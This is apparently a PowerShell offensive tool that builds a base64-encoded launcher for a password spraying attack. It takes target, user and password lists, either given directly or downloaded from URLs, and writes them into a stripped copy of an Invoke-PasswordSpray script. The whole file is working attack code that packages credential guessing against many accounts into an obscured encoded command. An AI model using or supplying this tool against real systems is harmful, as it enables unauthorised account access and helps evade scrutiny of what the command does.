<#
  .SYNOPSIS
    Execute a password spraying attack.
  .PARAMETER TargetsURL
    Specify a URL to a comma delimited target list.
  .PARAMETER UsersURL
    Specify a URL to a comma delimited target list.
  .PARAMETER PasswordsURL
    Specify a URL to a comma delimited target list.
  .PARAMETER Targets
    Specify a target, or multiple targets separated by commas.
  .PARAMETER Users
    Specify a user, or multiple users separated by commas.
  .PARAMETER Passwords
    Specify a password, or multiple passwords separated by commas.
  .NOTES
    Author: Luke Baggett
    Date: August 13, 2014
#>
function ConvertTo-EncodedPasswordSpray
{
  param(
    $TargetsURL = "",
    $UsersURL = "",
    $PasswordsURL = "",
    $Targets = "",
    $Users = "",
    $Passwords = ""
  )
  $Parameters = @("Targets","Users","Passwords")
  foreach($Parameter in $Parameters)
  {
    if((Get-Variable -Name ($Parameter + "URL") -ValueOnly) -ne "")
    {
      Set-Variable -Name ($Parameter + "URL") -Value ("(New-Object System.Net.WebClient).DownloadString('" + (Get-Variable -Name ($Parameter + "URL") -ValueOnly) + "').Split(',')")
    }
    else
    {
      $VariableSTR = "@("
      foreach($Line in (Get-Variable -Name $Parameter -ValueOnly))
      {
        $VariableSTR += "'"
        $VariableSTR += $Line
        $VariableSTR += "',"
      }
      $VariableSTR = $VariableSTR.TrimEnd(",")
      $VariableSTR += ")"
      Set-Variable -Name $Parameter -Value $VariableSTR
    }
  }

  Copy-Item .\Invoke-PasswordSpray.ps1 .\Encoded-PasswordSpray.ps1
  $Content = (Get-Content .\Encoded-PasswordSpray.ps1)
  if($TargetsURL -ne ""){$Content[16] = ("`$Targets=" + $TargetsURL)}
  if($UsersURL -ne ""){$Content[17] = ("`$Users=" + $UsersURL)}
  if($PasswordsURL -ne ""){$Content[18] = ("`$Passwords=" + $PasswordsURL)}
  if($Targets -ne ""){$Content[16] = ("`$Targets=" + $Targets)}
  if($Users -ne ""){$Content[17] = ("`$Users=" + $Users)}
  if($Passwords -ne ""){$Content[18] = ("`$Passwords=" + $Passwords)}
  foreach($num in 21..33){$Content[[string]$num]=""}
  foreach($num in 0..15){$Content[[string]$num]=""}
  $Content[-1]=""
  $Content[19]=""
  $Content | Set-Content -Force .\Encoded-PasswordSpray.ps1

  $contents = [system.io.file]::ReadAllText((pwd).Path + "\Encoded-PasswordSpray.ps1")
  $bytes = [Text.Encoding]::Unicode.GetBytes($contents)
  $encodedCommand = [Convert]::ToBase64String($bytes)

  Remove-Item -Force .\Encoded-PasswordSpray.ps1
  $encodedCommand

}